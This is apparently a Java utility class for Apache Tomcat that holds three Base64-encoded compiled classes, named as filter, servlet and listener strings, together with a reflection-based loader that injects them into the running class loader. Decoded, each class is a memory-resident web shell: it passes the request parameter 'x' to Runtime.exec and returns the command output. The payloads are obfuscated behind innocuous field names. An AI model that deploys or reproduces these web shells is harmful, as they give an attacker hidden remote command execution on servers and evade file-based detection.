package com.tomcat.util;

import org.apache.tomcat.util.codec.binary.Base64;
import sun.reflect.ReflectionFactory;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class ClassUtil extends ClassLoader {
    public final static String FILTER_STRING = "yv66vgAAADQAkwoAHQBKCQBLAEwIAE0KAE4ATwgAUAcAUQgAUgsABgBTCgBUAFUKAFQAVgcAVwcAWAoAWQBaCgAMAFsKAAsAXAgAXQoACwBeBwBfCgASAEoKABIAYAoAEgBhCwBiAGMKAGQAZQoAZgBnCgBmAGgKAGYAaQgARwcAagcAawcAbAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAnTGNvbS90b21jYXQvbWVtc2hlbGwvRmlsdGVyL1Rlc3RGaWx0ZXI7AQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7AQAKRXhjZXB0aW9ucwcAbQEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEAB3Byb2Nlc3MBABNMamF2YS9sYW5nL1Byb2Nlc3M7AQAGcmVhZGVyAQAYTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQADc3RyAQASTGphdmEvbGFuZy9TdHJpbmc7AQAEbGluZQEADnNlcnZsZXRSZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAPc2VydmxldFJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEAC2ZpbHRlckNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47AQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEADVN0YWNrTWFwVGFibGUHAGoHAG4HAG8HAHAHAFEHAHEHAFcHAHIHAHMBAAdkZXN0cm95AQAKU291cmNlRmlsZQEAD1Rlc3RGaWx0ZXIuamF2YQwAHwAgBwB0DAB1AHYBAAtpbml0IEZpbHRlcgcAdwwAeAB5AQAVRmlsdGVyIHdvcmtpbmcgb24gLi4uAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAAXgMAHoAewcAfAwAfQB+DAB/AIABABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgcAcQwAgQCCDAAfAIMMAB8AhAEAAAwAhQCGAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAIcAiAwAiQCGBwBvDACKAIsHAHIMAIwAjQcAjgwAjwCQDACRACAMAJIAIAEAJWNvbS90b21jYXQvbWVtc2hlbGwvRmlsdGVyL1Rlc3RGaWx0ZXIBABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YXgvc2VydmxldC9GaWx0ZXIBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQARamF2YS9sYW5nL1Byb2Nlc3MBABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAPZ2V0T3V0cHV0U3RyZWFtAQAlKClMamF2YXgvc2VydmxldC9TZXJ2bGV0T3V0cHV0U3RyZWFtOwEACGdldEJ5dGVzAQAEKClbQgEAIWphdmF4L3NlcnZsZXQvU2VydmxldE91dHB1dFN0cmVhbQEABXdyaXRlAQAFKFtCKVYBAAVmbHVzaAEABWNsb3NlACEAHAAdAAEAHgAAAAQAAQAfACAAAQAhAAAALwABAAEAAAAFKrcAAbEAAAACACIAAAAGAAEAAAAKACMAAAAMAAEAAAAFACQAJQAAAAEAJgAnAAIAIQAAAEEAAgACAAAACbIAAhIDtgAEsQAAAAIAIgAAAAoAAgAAAA0ACAAOACMAAAAWAAIAAAAJACQAJQAAAAAACQAoACkAAQAqAAAABAABACsAAQAsAC0AAgAhAAABcgAFAAkAAACJsgACEgW2AAQrwAAGOgQZBBIHuQAIAgDGAHG4AAkZBBIHuQAIAgC2AAo6BbsAC1m7AAxZGQW2AA23AA63AA86BhIQOgcZBrYAEVk6CMYAHLsAElm3ABMZB7YAFBkItgAUtgAVOgen/98suQAWAQAZB7YAF7YAGCy5ABYBALYAGSy5ABYBALYAGrEAAAADACIAAAAyAAwAAAASAAgAEwAOABQAGgAVACsAFgBAABcARAAZAE8AGgBoABwAdgAdAH8AHgCIACAAIwAAAFwACQArAF0ALgAvAAUAQABIADAAMQAGAEQARAAyADMABwBMADwANAAzAAgAAACJACQAJQAAAAAAiQA1ADYAAQAAAIkANwA4AAIAAACJADkAOgADAA4AewA7ADwABAA9AAAAPQAD/wBEAAgHAD4HAD8HAEAHAEEHAEIHAEMHAEQHAEUAAPwAIwcARf8AHwAFBwA+BwA/BwBABwBBBwBCAAAAKgAAAAYAAgBGACsAAQBHACAAAQAhAAAANwACAAEAAAAJsgACEhu2AASxAAAAAgAiAAAACgACAAAAJAAIACUAIwAAAAwAAQAAAAkAJAAlAAAAAQBIAAAAAgBJ";
    public final static String SERVLET_STRING = "yv66vgAAADQAjQoAHABHCQBIAEkIACUKAEoASwgATAgATQsATgBPCgBQAFEKAFAAUgcAUwcAVAoAVQBWCgALAFcKAAoAWAgAWQoACgBaBwBbCgARAEcKABEAXAoAEQBdCwBeAF8KAGAAYQoAYgBjCgBiAGQKAGIAZQgARAcAZgcAZwcAaAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAeTG1lbXNoZWxsL1NlcnZsZXQvVGVzdFNlcnZsZXQ7AQAEaW5pdAEAIChMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOylWAQANc2VydmxldENvbmZpZwEAHUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7AQAKRXhjZXB0aW9ucwcAaQEAEGdldFNlcnZsZXRDb25maWcBAB8oKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7AQAHc2VydmljZQEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYBAAdwcm9jZXNzAQATTGphdmEvbGFuZy9Qcm9jZXNzOwEABnJlYWRlcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEAA3N0cgEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABGxpbmUBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAA1TdGFja01hcFRhYmxlBwBqBwBTBwBrBwBmBwBsBwBtBwBuAQAOZ2V0U2VydmxldEluZm8BABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAQVGVzdFNlcnZsZXQuamF2YQwAHgAfBwBvDABwAHEHAHIMAHMAdAEAB3NlcnZsZXQBAAF4BwBsDAB1AHYHAHcMAHgAeQwAegB7AQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIHAGoMAHwAfQwAHgB+DAAeAH8BAAAMAIAAQwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDACBAIIMAIMAQwcAbQwAhACFBwBrDACGAIcHAIgMAIkAigwAiwAfDACMAB8BABxtZW1zaGVsbC9TZXJ2bGV0L1Rlc3RTZXJ2bGV0AQAQamF2YS9sYW5nL09iamVjdAEAFWphdmF4L3NlcnZsZXQvU2VydmxldAEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9Qcm9jZXNzAQAQamF2YS9sYW5nL1N0cmluZwEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEAE2phdmEvaW8vSU9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBAA9nZXRPdXRwdXRTdHJlYW0BACUoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRPdXRwdXRTdHJlYW07AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAhamF2YXgvc2VydmxldC9TZXJ2bGV0T3V0cHV0U3RyZWFtAQAFd3JpdGUBAAUoW0IpVgEABWZsdXNoAQAFY2xvc2UAIQAbABwAAQAdAAAABgABAB4AHwABACAAAAAvAAEAAQAAAAUqtwABsQAAAAIAIQAAAAYAAQAAAAgAIgAAAAwAAQAAAAUAIwAkAAAAAQAlACYAAgAgAAAAQQACAAIAAAAJsgACEgO2AASxAAAAAgAhAAAACgACAAAADAAIAA0AIgAAABYAAgAAAAkAIwAkAAAAAAAJACcAKAABACkAAAAEAAEAKgABACsALAABACAAAAAsAAEAAQAAAAIBsAAAAAIAIQAAAAYAAQAAABEAIgAAAAwAAQAAAAIAIwAkAAAAAQAtAC4AAgAgAAABNwAFAAcAAAB/sgACEgW2AAQrEga5AAcCAMYAbrgACCsSBrkABwIAtgAJTrsAClm7AAtZLbYADLcADbcADjoEEg86BRkEtgAQWToGxgAcuwARWbcAEhkFtgATGQa2ABO2ABQ6Baf/3yy5ABUBABkFtgAWtgAXLLkAFQEAtgAYLLkAFQEAtgAZsQAAAAMAIQAAAC4ACwAAABYACAAYABMAGQAiABoANgAbADoAHQBFAB4AXgAgAGwAIQB1ACIAfgAkACIAAABIAAcAIgBcAC8AMAADADYASAAxADIABAA6AEQAMwA0AAUAQgA8ADUANAAGAAAAfwAjACQAAAAAAH8ANgA3AAEAAAB/ADgAOQACADoAAAAkAAP+ADoHADsHADwHAD38ACMHAD3/AB8AAwcAPgcAPwcAQAAAACkAAAAGAAIAKgBBAAEAQgBDAAEAIAAAACwAAQABAAAAAgGwAAAAAgAhAAAABgABAAAAKAAiAAAADAABAAAAAgAjACQAAAABAEQAHwABACAAAAA3AAIAAQAAAAmyAAISGrYABLEAAAACACEAAAAKAAIAAAAtAAgALgAiAAAADAABAAAACQAjACQAAAABAEUAAAACAEY=";
    public final static String LISTENER_STRING = "yv66vgAAADQAoQoAIwBJCQBKAEsIAEwKAE0ATgoATwBQCABRCwBSAFMKAFQAVQoAVABWBwBXBwBYCgBZAFoKAAsAWwoACgBcCABdCgAKAF4HAF8KABEASQoAEQBgCgARAGEHAGIKACMAYwgANQoAZABlCgBmAGcKAGYAaAcAaQoAGwBqCgBrAGwKAG0ATgcAbgoAHwBvCABwBwBxBwByBwBzAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACtMY29tL3RvbWNhdC9tZW1zaGVsbC9MaXN0ZW5lci9UZXN0TGlzdGVuZXI7AQAQcmVxdWVzdERlc3Ryb3llZAEAJihMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OylWAQAHcHJvY2VzcwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAZyZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAANzdHIBABJMamF2YS9sYW5nL1N0cmluZzsBAARsaW5lAQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEADHJlcXVlc3RmaWVsZAEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAANyZXEBACdMb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdDsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQATc2VydmxldFJlcXVlc3RFdmVudAEAI0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0RXZlbnQ7AQANU3RhY2tNYXBUYWJsZQcAdAcAVwcAdQcAcQcAdgcAbgEAEnJlcXVlc3RJbml0aWFsaXplZAEAClNvdXJjZUZpbGUBABFUZXN0TGlzdGVuZXIuamF2YQwAJQAmBwB3DAB4AHkBAAdkZXN0cm95BwB6DAB7AHwHAHYMAH0AfgEAAXgHAH8MAIAAgQcAggwAgwCEDACFAIYBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgcAdAwAhwCIDAAlAIkMACUAigEAAAwAiwCMAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAI0AjgwAjwCMAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAwAkACRBwCSDACTAJQHAJUMAJYAlwwAmACZAQAlb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdAwAmgCbBwCcDACdAJ4HAJ8BABNqYXZhL2xhbmcvRXhjZXB0aW9uDACgACYBAARpbml0AQApY29tL3RvbWNhdC9tZW1zaGVsbC9MaXN0ZW5lci9UZXN0TGlzdGVuZXIBABBqYXZhL2xhbmcvT2JqZWN0AQAkamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdExpc3RlbmVyAQARamF2YS9sYW5nL1Byb2Nlc3MBABBqYXZhL2xhbmcvU3RyaW5nAQAhamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARZ2V0U2VydmxldFJlcXVlc3QBACAoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAD2phdmEvbGFuZy9DbGFzcwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAtnZXRSZXNwb25zZQEAKigpTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlOwEAJm9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAPcHJpbnRTdGFja1RyYWNlACEAIgAjAAEAJAAAAAMAAQAlACYAAQAnAAAALwABAAEAAAAFKrcAAbEAAAACACgAAAAGAAEAAAAOACkAAAAMAAEAAAAFACoAKwAAAAEALAAtAAEAJwAAAZMABQAJAAAAn7IAAhIDtgAEK7YABRIGuQAHAgDGAIO4AAgrtgAFEga5AAcCALYACU27AApZuwALWSy2AAy3AA23AA5OEg86BC22ABBZOgXGABy7ABFZtwASGQS2ABMZBbYAE7YAFDoEp//gK7YABcAAFToGGQa2ABYSF7YAGDoHGQcEtgAZGQcZBrYAGsAAGzoIGQi2ABy2AB0ZBLYAHqcACE0stgAgsQABAAgAlgCZAB8AAwAoAAAAQgAQAAAAEQAIABMAFgAUACgAFQA7ABYAPwAYAEkAGQBiABsAawAcAHcAHQB9AB4AiQAfAJYAIwCZACEAmgAiAJ4AJAApAAAAZgAKACgAbgAuAC8AAgA7AFsAMAAxAAMAPwBXADIAMwAEAEYAUAA0ADMABQBrACsANQA2AAYAdwAfADcAOAAHAIkADQA5ADoACACaAAQAOwA8AAIAAACfACoAKwAAAAAAnwA9AD4AAQA/AAAAJgAF/gA/BwBABwBBBwBC/AAiBwBC/wAzAAIHAEMHAEQAAEIHAEUEAAEARgAtAAEAJwAAAEEAAgACAAAACbIAAhIhtgAEsQAAAAIAKAAAAAoAAgAAACgACAApACkAAAAWAAIAAAAJACoAKwAAAAAACQA9AD4AAQABAEcAAAACAEg=";

    public static Class<?> getClass(String ClassCode) throws IOException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, InstantiationException {
        ClassLoader loader = Thread.currentThread().getContextClassLoader();
        byte[] bytes = Base64.decodeBase64(ClassCode);

        Method method = null;
        Class<?> clz    = loader.getClass();
        while (method == null && clz != Object.class) {
            try {
                method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            } catch (NoSuchMethodException ex) {
                clz = clz.getSuperclass();
            }
        }

        if (method != null) {
            method.setAccessible(true);
            return (Class<?>) method.invoke(loader, bytes, 0, bytes.length);
        }

        return null;
    }
    /*public static Class<?> getClass0(String folder, String className) throws IOException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, InstantiationException {
        ClassLoader loader = Thread.currentThread().getContextClassLoader();
        FileInputStream fis = new FileInputStream(new File(folder+className+".class"));
        byte[] buf = new byte[1024];
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        int len;
        while((len=fis.read(buf))!=-1){
            baos.write(buf,0, len);
        }
        byte[] bytes = baos.toByteArray();

        Method method = null;
        Class<?> clz    = loader.getClass();
        while (method == null && clz != Object.class) {
            try {
                method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            } catch (NoSuchMethodException ex) {
                clz = clz.getSuperclass();
            }
        }

        if (method != null) {
            method.setAccessible(true);
            return (Class<?>) method.invoke(loader, bytes, 0, bytes.length);
        }

        return null;
    }*/
}